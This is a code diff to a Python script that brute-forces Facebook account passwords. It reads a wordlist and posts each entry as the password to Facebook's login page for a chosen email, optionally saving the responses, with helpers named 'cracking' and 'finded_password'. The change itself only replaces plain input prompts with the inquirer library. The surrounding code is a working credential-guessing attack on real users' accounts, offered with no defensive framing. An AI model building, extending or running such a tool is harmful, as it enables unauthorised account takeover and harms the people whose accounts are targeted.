@@ -3,6 +3,7 @@ from os import getcwd, mkdir
 from utils import get_element, convert_form_to_dict
 from terminal import cracking, finded_password
 from time import sleep
+import inquirer
 
 settings = {
     "url": "https://www.facebook.com/login.php"
@@ -25,12 +26,16 @@ def writeFile(name, content):
 
 
 def main():
-    email = input("What your email: ")
-    saveLogs = input("Save logs (y/n): ")
+    questions = [
+        inquirer.Text("email", message="What your email?"),
+        inquirer.Confirm("logs", message="Save logs?")
+    ]
+
+    options = inquirer.prompt(questions)
     html = getPage()
     formEl = get_element(html, "form")
     data = convert_form_to_dict(formEl)
-    data["email"] = email
+    data["email"] = options["email"]
 
     file = open(f"{getcwd()}/data/wordlist1.txt", "r")
     while True:
@@ -40,7 +45,7 @@ def main():
             data["pass"] = line
             res = session.post(settings["url"], data=data)
             content = res.text
-            if saveLogs == "y":
+            if options["logs"]:
                 try:
                     writeFile(line, content)
                 except FileNotFoundError:
